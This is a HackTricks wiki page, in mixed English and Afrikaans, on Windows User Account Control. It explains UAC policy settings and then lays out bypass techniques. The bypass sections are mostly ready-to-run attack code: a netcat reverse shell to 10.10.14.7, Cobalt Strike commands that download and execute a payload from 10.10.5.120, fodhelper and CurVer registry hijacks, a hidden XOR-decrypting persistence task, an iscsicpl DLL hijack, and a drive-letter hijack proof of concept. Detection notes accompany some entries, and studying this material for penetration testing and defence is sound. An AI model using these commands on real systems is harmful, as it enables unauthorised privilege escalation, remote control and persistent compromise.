# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n feature wat 'n **bevestigingsprompt vir verhoogde aktiwiteite** moontlik maak. Applications het verskillende `integrity`-vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat **die stelsel moontlik kan kompromitteer**. When UAC geaktiveer is, applications en take **loop altyd onder die security context van 'n nie-administrateur rekening** tensy 'n administrator hierdie applications/take eksplisiet magtig om administrator-vlak toegang tot die system te hê om uit te voer. Dit is 'n gerief-funksie wat administrators beskerm teen onbedoelde changes, maar word nie as 'n security boundary beskou nie.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

When UAC in place is, word 'n administrator user twee tokens gegee: 'n standard user key, om gewone actions op gewone level uit te voer, en een met die admin privileges.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek in groot detail hoe UAC work en sluit die logon process, user experience, en UAC architecture in. Administrators can security policies gebruik om te configureer how UAC werk spesifiek vir their organization op die local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. Die verskillende settings word in detail [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) bespreek. There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

Die **local security policies** ("secpol.msc" op meeste systems) is by default gekonfigureer om **nie-admin users te verhinder om software installations uit te voer**. This means that even if a non-admin user can download the installer for your software, they won't be able to run it without an admin account.

### Registry Keys to Force UAC to Ask for Elevation

As a standard user with no admin rights, you can make sure the "standard" account is **gevra vir credentials deur UAC** when it attempts to perform certain actions. This action would require modifying certain **registry keys**, for which you need admin permissions, unless there is a **UAC bypass**, or the attacker is already logged as admin.

Even if the user is in the **Administrators** group, these changes force the user to **sy account credentials weer in te voer** in order to perform administrative actions.

**The only downside is that this approach needs UAC disabled to work, which is unlikely to be the case in production environments.**

The registry keys and entries that you must change are the following (with their default values in parentheses):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

This can also be done manually through the Local Security Policy tool. Once changed, administrative operations prompt the user to re-enter their credentials.

### Note

**User Account Control is not a security boundary.** Therefore, standard users cannot break out of their accounts and gain administrator rights without a local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode gebruik integrity checks om prosesse met hoë-integriteit-vlakke (soos web browsers) te keer om toegang te kry tot data met lae-integriteit-vlakke (soos die temporary Internet files folder). Dit word gedoen deur die browser met 'n low-integrity token te laat loop. Wanneer die browser probeer om toegang te kry tot data wat in die low-integrity zone gestoor is, kontroleer die operating system die integrity level van die proses en laat toegang dienooreenkomstig toe. Hierdie feature help om te voorkom dat remote code execution attacks toegang kry tot sensitiewe data op die system.
- Wanneer 'n user by Windows aanmeld, skep die system 'n access token wat 'n lys van die user's privileges bevat. Privileges word gedefinieer as die kombinasie van 'n user's rights en capabilities. Die token bevat ook 'n lys van die user's credentials, wat credentials is wat gebruik word om die user by die computer en by resources op die network te authenticate.

### Autoadminlogon

Om Windows te configure om outomaties 'n spesifieke user by startup aan te meld, stel die **`AutoAdminLogon` registry key** in. Dit is nuttig vir kiosk environments of vir testing purposes. Gebruik dit slegs op secure systems, aangesien dit die password in die registry blootstel.

Stel die volgende keys in met die Registry Editor of `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Om na normale logon behavior terug te keer, stel `AutoAdminLogon` op 0.

## UAC bypass

> [!TIP]
> Let daarop dat as jy grafiese access tot die victim het, UAC bypass reguit vorentoe is, aangesien jy eenvoudig op "Yes" kan klik wanneer die UAC prompt verskyn

Die UAC bypass is nodig in die volgende situasie: **die UAC is geactiveer, jou process loop in 'n medium integrity context, en jou user behoort aan die administrators group**.

Dit is belangrik om te noem dat dit **veel moeiliker is om die UAC te bypass as dit op die hoogste security level (Always) is as wanneer dit op enige van die ander levels (Default) is.**

### UAC disabled

As UAC reeds disabled is (`ConsentPromptBehaviorAdmin` is **`0`**) kan jy **'n reverse shell met admin privileges** (high integrity level) execute met iets soos:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Baie** Basiese UAC "bypass" (volledige lêerstelseltoegang)

As jy 'n shell het met 'n gebruiker wat in die Administrators-groep is, kan jy die **C$** wat via SMB (lêerstelsel) gedeel word, plaaslik as 'n nuwe skyf mount en jy sal **toegang hê tot alles binne die lêerstelsel** (selfs die Administrator tuisgids).

> [!WARNING]
> **Dit lyk of hierdie truuk nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC-bypass met cobalt strike

Die Cobalt Strike-tegnieke sal net werk as UAC nie op sy maksimum sekuriteitsvlak ingestel is nie
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### KRBUACBypass

Dokumentasie en hulpmiddel by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)wat 'n **samestelling** is van verskeie UAC bypass exploits. Let daarop dat jy **UACME moet compile using visual studio or msbuild**. Die samestelling sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`) , jy sal moet weet **watter een jy nodig het.**\
Jy moet **versigtig wees** omdat sommige bypasses **some other programs sal promtp** wat die **gebruiker** sal **alert** dat iets besig is om te gebeur.

UACME het die **build version from which each technique started working**. Jy kan soek vir 'n tegniek wat jou weergawes raak:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, gebruik [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history) bladsy kry jy die Windows-vrystelling `1607` uit die build weergawes.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die trusted binary `fodhelper.exe` is auto-elevated op moderne Windows. Wanneer dit gelanseer word, vra dit die per-user registry pad hieronder navraag sonder om die `DelegateExecute` verb te valideer. Deur 'n opdrag daar te plaas, kan 'n Medium Integrity proses (gebruiker is in Administrators) 'n High Integrity proses laat spawn sonder 'n UAC prompt.

Registry pad wat deur fodhelper nagevra word:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-stappe (stel jou payload, en trigger dan)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Werk wanneer die huidige gebruiker ’n lid van Administrators is en UAC-vlak standaard/lenient is (nie Always Notify met ekstra beperkings nie).
- Gebruik die `sysnative` path om ’n 64-bit PowerShell vanaf ’n 32-bit proses op 64-bit Windows te begin.
- Payload kan enige command wees (PowerShell, cmd, of ’n EXE path). Vermy UI-prompts vir stealth.

#### CurVer/extension hijack variant (HKCU only)

Onlangse samples wat `fodhelper.exe` abuse vermy `DelegateExecute` en eerder **die `ms-settings` ProgID redirect** via die per-user `CurVer` value. Die auto-elevated binary resolve steeds die handler onder `HKCU`, so geen admin token is nodig om die keys te plant nie:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Sodra verhoog, **deaktiveer** malware gewoonlik toekomstige prompts deur `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` op `0` te stel, en voer dan bykomende defense evasion uit (bv. `Add-MpPreference -ExclusionPath C:\ProgramData`) en herskep persistence om as high integrity te loop. 'n Tipiese persistence-taak stoor 'n **XOR-encrypted PowerShell script** op skyf en dekodeer/voer dit in-memory elke uur uit:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Hierdie variant maak steeds die dropper skoon en laat net die staged payloads oor, wat beteken opsporing berus op die monitering van die **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, of scheduled tasks wat PowerShell in memory decrypt.

#### Meer UAC bypass

**Al** die tegnieke wat hier gebruik word om AUC te bypass **vereis** 'n **full interactive shell** met die slagoffer (n gewone nc.exe shell is nie genoeg nie).

Jy kan dit met 'n **meterpreter** session kry. Migrate na 'n **process** wat se **Session**-waarde gelyk is aan **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC Bypass with GUI

As jy toegang het tot 'n **GUI kan jy eenvoudig die UAC prompt aanvaar** wanneer jy dit kry; jy hoef nie regtig 'n bypass te hê nie. So, toegang tot 'n GUI sal jou toelaat om die UAC te bypass.

Verder, as jy 'n GUI session kry wat iemand gebruik het (moontlik via RDP) is daar **sommige tools wat as administrator sal loop** vanwaar jy byvoorbeeld direk 'n **cmd** as admin kan **run** sonder om weer deur UAC gevra te word soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan 'n bietjie meer **stealthy** wees.

### Noisy brute-force UAC bypass

As jy nie omgee om noisy te wees nie kan jy altyd **iets soos** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **run** wat **vir verhoogde permissions vra totdat die user dit aanvaar**.

### Jou eie bypass - Basic UAC bypass methodology

As jy na **UACME** kyk sal jy sien dat **die meeste UAC bypasses 'n Dll Hijacking vulnerabilit**y misbruik (hoofsaaklik deur die malicious dll na _C:\Windows\System32_ te skryf). [Lees dit om te leer hoe om 'n Dll Hijacking vulnerability te vind](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Vind 'n binary wat sal **autoelevate** (kontroleer dat wanneer dit uitgevoer word dit in 'n high integrity level loop).
2. Vind met procmon "**NAME NOT FOUND**" events wat kwesbaar kan wees vir **DLL Hijacking**.
3. Jy sal waarskynlik die **DLL moet skryf** binne sommige **protected paths** (soos C:\Windows\System32) waar jy nie skryftoestemming het nie. Jy kan dit omseil deur:
1. **wusa.exe**: Windows 7,8 en 8.1. Dit laat toe om die content van 'n CAB file binne protected paths te extract (omdat hierdie tool vanaf 'n high integrity level uitgevoer word).
2. **IFileOperation**: Windows 10.
4. Berei 'n **script** voor om jou DLL binne die protected path te copy en die vulnerable en autoelevated binary uit te voer.

### Nog 'n UAC bypass tegniek

Bestaan daarin om te kyk of 'n **autoElevated binary** uit die **registry** die **naam/path** van 'n **binary** of **command** wat **executed** gaan word probeer **read** (dit is interessanter as die binary hierdie info binne die **HKCU** soek).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Die 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is 'n **auto-elevated** binary wat misbruik kan word om `iscsiexe.dll` via search order te load. As jy 'n malicious `iscsiexe.dll` binne 'n **user-writable** folder kan plaas en dan die huidige user se `PATH` kan modify (byvoorbeeld via `HKCU\Environment\Path`) sodat daardie folder gesoek word, kan Windows die attacker DLL binne die verhoogde `iscsicpl.exe` process load **sonder om 'n UAC prompt te wys**.

Praktiese notas:
- Dit is nuttig wanneer die huidige user in **Administrators** is maar by **Medium Integrity** loop as gevolg van UAC.
- Die **SysWOW64** copy is die relevante een vir hierdie bypass. Behandel die **System32** copy as 'n aparte binary en validate gedrag onafhanklik.
- Die primitive is 'n kombinasie van **auto-elevation** en **DLL search-order hijacking**, so dieselfde ProcMon workflow wat vir ander UAC bypasses gebruik word is nuttig om die ontbrekende DLL load te validate.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- Alert on `reg add` / registry writes to `HKCU\Environment\Path` onmiddellik gevolg deur uitvoering van `C:\Windows\SysWOW64\iscsicpl.exe`.
- Hunt vir `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korrelleer `iscsicpl.exe` launches met unexpected child processes or DLL loads van buite die normale Windows directories.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
